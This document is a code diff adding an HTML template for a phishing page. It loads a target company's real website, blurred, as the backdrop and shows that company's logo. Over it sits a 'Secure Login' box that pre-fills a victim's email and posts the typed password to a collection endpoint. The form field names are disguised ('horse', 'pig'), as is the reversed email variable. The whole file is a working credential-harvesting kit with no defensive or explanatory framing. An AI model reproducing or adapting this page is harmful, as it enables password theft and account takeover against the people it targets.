@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
+  <title>{{ins}} |{{eman}} access to {{ins}}</title>
+  <style>
+    :root {
+      --white-glass: rgba(255, 255, 255, 0.05);
+      --input-glass: rgba(255, 255, 255, 0.07);
+      --border-glass: rgba(255, 255, 255, 0.15);
+      --blur: 20px;
+      --accent: #0a66c2;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    html, body {
+      height: 100%;
+      overflow: hidden;
+    }
+
+    iframe {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      z-index: -2;
+      border: none;
+      filter: blur(3px) brightness(0.7);
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: transparent;
+      z-index: -1;
+    }
+
+    .login-box {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      backdrop-filter: blur(var(--blur));
+      background: var(--white-glass);
+      border: 1px solid var(--border-glass);
+      border-radius: 18px;
+      padding: 40px 30px;
+      width: 90%;
+      max-width: 400px;
+      color: #fff;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+      animation: zoomIn 0.8s ease-out;
+    }
+
+    .login-box .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 70px;
+      border-radius: 50%;
+      box-shadow: 0 4px 8px rgba(255,255,255,0.2);
+    }
+
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      font-size: 22px;
+      color: #f1f1f1;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      border: none;
+      border-radius: 10px;
+      background: var(--input-glass);
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+
+    .login-box input::placeholder {
+      color: #ccc;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: var(--accent);
+      border: none;
+      border-radius: 10px;
+      color: white;
+      font-weight: 600;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-box button:hover {
+      background-color: #004a99;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      text-align: center;
+      color: #ddd;
+    }
+
+    @keyframes zoomIn {
+      from { opacity: 0; transform: scale(0.9) translate(-50%, -50%); }
+      to { opacity: 1; transform: scale(1) translate(-50%, -50%); }
+    }
+
+    @media (max-width: 480px) {
+      .login-box {
+        padding: 30px 20px;
+      }
+
+      .login-box h2 {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Background iframe site -->
+  <iframe src="https://{{ins}}"></iframe>
+  <div class="overlay"></div>
+
+  <!-- Transparent Login Form -->
+  <div class="login-box">
+    <img src="https://api.kickfire.com/logo?website={{ins}}" alt="Company Logo" class="logo">
+    <h2>Secure Login</h2>
+    <form action="first" method="post">
+      <input type="email" name="horse" value="{{eman}}" required />
+      <input type="password" name="pig" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <div class="footer">
+      © 2025 {{ins}} · All rights reserved
+    </div>
+  </div>
+
+</body>
+</html>
